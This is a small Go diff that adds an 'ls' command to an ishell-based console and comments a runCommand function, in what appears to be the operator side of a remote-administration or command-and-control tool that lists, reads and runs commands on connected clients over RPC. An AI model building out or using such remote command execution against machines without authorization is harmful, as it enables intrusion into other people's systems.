@@ -40,6 +40,12 @@ func (client activeClient) shellClient() {
 	})
 
 	shell.AddCmd(&ishell.Cmd{
+		Name: "ls",
+		Func: client.ls,
+		Help: "list the files in a directory",
+	})
+
+	shell.AddCmd(&ishell.Cmd{
 		Name:      "cat",
 		Func:      client.Cat,
 		Help:      "print the content of a file: usage cat <file>",
@@ -246,6 +252,7 @@ func (client *activeClient) Ping(c *ishell.Context) error {
 	return client.RPC.Call("API.Ping", void, &void)
 }
 
+// RUN A COMMAND ON CLIENT
 func (client *activeClient) runCommand(c *ishell.Context) {
 	command := strings.Join(c.Args, " ")
 	var r string
